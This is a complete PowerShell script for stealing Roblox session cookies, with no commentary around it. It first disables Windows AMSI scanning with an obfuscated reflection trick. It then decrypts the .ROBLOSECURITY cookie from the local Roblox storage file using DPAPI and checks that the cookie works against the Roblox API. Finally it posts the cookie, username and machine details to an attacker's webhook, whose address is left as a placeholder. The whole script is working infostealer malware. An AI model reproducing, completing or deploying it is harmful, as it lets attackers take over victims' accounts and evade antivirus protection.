# AMSI bypass
$a=[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65)+'msi'+$([char]85)+'tils')
$a.GetField($([char]97)+'msiInitFailed','NonPublic,Static').SetValue($null,$true)

$w="WEBHOOK_PLACEHOLDER"

# CANARY - verify we can reach webhook
try{$b=@{content="Stealer online - $env:COMPUTERNAME"}|ConvertTo-Json;iwr -UseBasicParsing -Method POST -Uri $w -Body $b -ContentType 'application/json' -TimeoutSec 10|Out-Null}catch{}

Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Security

function sw($t,$c,$f,$fc){
  $e=@{title=$t;color=$c;fields=$f;footer=@{text="$env:COMPUTERNAME / $env:USERNAME"}}
  $p=@{embeds=@($e)}|ConvertTo-Json -Depth 5 -Compress
  try{iwr -UseBasicParsing -Method POST -Uri $w -Body $p -ContentType 'application/json'|Out-Null}catch{}
  if($fc){try{
    $b=[Guid]::NewGuid().ToString();$lf="`r`n";$bl=@()
    $bl+='--'+$b;$bl+='Content-Disposition: form-data; name="file"; filename="'+$fc[0]+'"';$bl+='Content-Type: text/plain';$bl+='';$bl+=$fc[1];$bl+='--'+$b+'--'
    $wc=New-Object Net.WebClient;$wc.Headers.Add('Content-Type','multipart/form-data; boundary='+$b);$wc.UploadString($w,'POST',$bl -join $lf)|Out-Null
  }catch{}}
}

$cookie=$null;$found=$false;$src='none'
$sp=Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\robloxcookies.dat'
if(Test-Path $sp){
  try{
    $raw=Get-Content $sp -Raw -EA Stop
    if($raw -match '^\s*\{'){
      try{
        $d=$raw|ConvertFrom-Json
        if($d.CookiesData){
          $eb=[Convert]::FromBase64String($d.CookiesData)
          $db=[System.Security.Cryptography.ProtectedData]::Unprotect($eb,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
          $txt=[Text.Encoding]::UTF8.GetString($db)
          if($txt -match '\.ROBLOSECURITY\s+([^\s;]+)'){$cookie=$matches[1];$found=$true;$src='File'}
        }
      }catch{}
    }
    elseif($raw -match '(_\|WARNING)'){$cookie=$raw.Trim();$found=$true;$src='File'}
  }catch{}
}

if($cookie){
  $h=@{'Cookie'='.ROBLOSECURITY='+$cookie;'User-Agent'='Mozilla/5.0'}
  $rn='?';$rid='0';$valid=$false
  try{$r=iwr -UseBasicParsing -Uri 'https://users.roblox.com/v1/users/authenticated' -Headers $h -TimeoutSec 10|ConvertFrom-Json;$rn=$r.name;$rid=$r.id;$valid=$true}catch{}
  $f=@(@{name='Username';value='@'+$rn;inline=$true},@{name='ID';value=$rid.ToString();inline=$true},@{name='Source';value=$src;inline=$true},@{name='Valid';value=if($valid){'Yes'}else{'Expired'};inline=$false})
  sw 'Roblox Cookie' 0x00B06F $f @("cookie_$rn.txt",$cookie)
}else{sw 'No Roblox Cookie' 0xFF0000 @(@{name='Status';value='Not found on this machine';inline=$false}) $null}
